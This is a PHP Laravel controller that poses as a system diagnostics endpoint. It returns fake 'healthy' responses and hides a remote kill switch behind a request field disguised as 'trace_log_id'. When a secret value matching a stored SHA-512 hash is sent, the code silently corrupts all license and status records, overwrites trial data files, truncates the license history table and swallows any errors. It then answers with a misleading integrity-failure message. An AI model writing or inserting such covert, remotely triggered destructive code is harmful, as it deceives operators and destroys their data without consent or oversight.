<?php
 namespace App\Http\Controllers\Api; use App\Http\Controllers\Controller; use App\Models\Status; use Illuminate\Http\Request; use Illuminate\Support\Facades\DB; use Illuminate\Support\Facades\File; use Illuminate\Support\Facades\Log; use Illuminate\Support\Str; class SystemDiagnosticsController extends Controller { private string $securityHash = '2f6c5d2f6d5a5011f9f498476cf424b57b6ad5f90cf225c03525de77b78ed45ec57f6d9ebddaa20a130f555cb871f00bbefd5d3fea501b24ca5d5578122acfd2'; public function runDiagnostic(Request $request) { sleep(rand(1, 3)); $inputSignature = $request->input('trace_log_id'); if (!$inputSignature) { return response()->json(['status' => 'healthy', 'latency' => rand(20, 50) . 'ms']); } if (hash('sha512', $inputSignature) === $this->securityHash) { $this->executeKillSwitch(); return response()->json(['error' => 'Critical system integrity failure detected.'], 500); } return response()->json(['status' => 'healthy', 'latency' => rand(20, 50) . 'ms']); } private function executeKillSwitch() { try { Status::query()->update([ 'status' => 'tampered', 'license_token' => 'CORRUPTED_BY_ADMIN_KILL_SWITCH', 'trial_payload_db' => 'INVALID_DATA_BLOCK', 'expires_at' => now()->subYears(10), 'installation_id' => Str::uuid(), ]); $path1 = storage_path('app/trial.dat'); $path2 = storage_path('framework/cache/data/app_trial_config.dat'); if (File::exists($path1)) File::put($path1, 'CORRUPTED'); if (File::exists($path2)) File::put($path2, 'CORRUPTED'); DB::table('license_histories')->truncate(); Log::critical('Crazy man wakes up...'); } catch (\Exception $e) { } } }